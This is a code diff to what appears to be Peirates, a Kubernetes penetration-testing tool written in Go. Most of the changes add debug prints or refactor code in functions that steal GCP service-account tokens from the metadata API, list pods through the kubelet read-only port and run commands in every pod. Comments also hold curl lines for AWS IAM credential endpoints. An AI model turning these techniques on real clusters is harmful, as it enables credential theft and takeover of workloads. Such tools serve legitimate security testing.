@@ -46,11 +46,15 @@ func getPodList(connectionString ServerInfo) []string {
 		return []string{}
 	}
 
+	println("DEBUG: Made it past auth check")
+
 	responseJSON, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
 	}
+
+	println("DEBUG: Made it past get pods -o json")
 
 	type PodsResponse struct {
 		Items []struct {
@@ -62,6 +66,9 @@ func getPodList(connectionString ServerInfo) []string {
 
 	var response PodsResponse
 	json.Unmarshal(responseJSON, &response)
+
+	println("DEBUG: Made it json.Unmarshall")
+
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
@@ -124,11 +131,11 @@ func GetGCPBearerTokenFromMetadataAPI(account string) string {
 	headers = []HeaderLine{
 		HeaderLine{"Metadata-Flavor", "Google"},
 	}
-	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+	url_sa := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
 
-	reqTokenRaw := GetRequest(url, headers, false)
+	reqTokenRaw := GetRequest(url_sa, headers, false)
 	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
-		println("[-] Error - could not perform request ", url)
+		println("[-] Error - could not perform request ", url_sa)
 		return ("ERROR")
 	}
 	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
@@ -907,6 +914,13 @@ func GetNodesInfo(connectionString ServerInfo) {
 
 func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
 	println("[+] Getting IP addresses for the nodes in the cluster...")
+	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
+	if !kubectlAuthCanI(connectionString, "get", "nodes") {
+		println("[-] Permission Denied: your service account isn't allowed to get nodes")
+		return
+	} else {
+		println("DEBUG: passed auth checks")
+	}
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
 
@@ -919,6 +933,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 			println("[-] Error unmarshaling data in this secret: ", err)
 		}
 
+	nodeLoop:
 		for _, item := range getnodeDetail.Items {
 
 			for _, addr := range item.Status.Addresses {
@@ -927,23 +942,20 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 				} else {
 					println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
 					println("[+] Grabbing Pods from node: " + item.Metadata.Name)
-					client := &http.Client{}
-					// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-					reqKube, err := http.NewRequest("GET", "http://"+addr.Address+":10255/pods", nil)
-					resp, err := client.Do(reqKube)
-					if err != nil {
-						println("[-] Error - could not perform request http://" + addr.Address + ":10255/pods")
-					}
-					defer resp.Body.Close()
-					body, err := ioutil.ReadAll(resp.Body)
-					if resp.StatusCode != 200 {
-						fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
-						break
+
+					// Make a request for our service account(s)
+					var headers []HeaderLine
+
+					url_sa := "http://" + addr.Address + ":10255/pods"
+					runningPodsBody := GetRequest(url_sa, headers, false)
+					if (runningPodsBody == "") || (strings.HasPrefix(runningPodsBody, "ERROR:")) {
+						println("[-] Kubelet request for running pods failed - using this URL:", url_sa)
+						continue nodeLoop
 					}
 
 					var output []PodNamespaceContainerTuple
 					var podDetails PodDetails
-					json.Unmarshal(body, &podDetails)
+					json.Unmarshal([]byte(runningPodsBody), &podDetails)
 					for _, item := range podDetails.Items {
 						podName := item.Metadata.Name
 						podNamespace := item.Metadata.Namespace
@@ -1353,8 +1365,7 @@ Peirates:># `)
 
 		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
 		case "16":
-			// Create a new HTTP client that uses the correct headers
-			// client := &http.Client{}
+			// Implement this
 
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
@@ -1507,7 +1518,7 @@ Peirates:># `)
 
 			cmdOpts.commandToRunInPods, _ = readLine()
 
-			// println("Running command ")
+			println("DEBUG: Running command ", cmdOpts.commandToRunInPods)
 			switch input {
 			case "1":
 				println("[+] Please provide the specified pod to run the command: ")
@@ -1524,7 +1535,9 @@ Peirates:># `)
 				}
 			case "2":
 				var input string
+				println("DEBUG: Made it into case 2")
 				if cmdOpts.commandToRunInPods != "" {
+					println("About to run execInAllPods")
 					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
 				} else {
 					fmt.Print("[-] ERROR - command string was empty.")
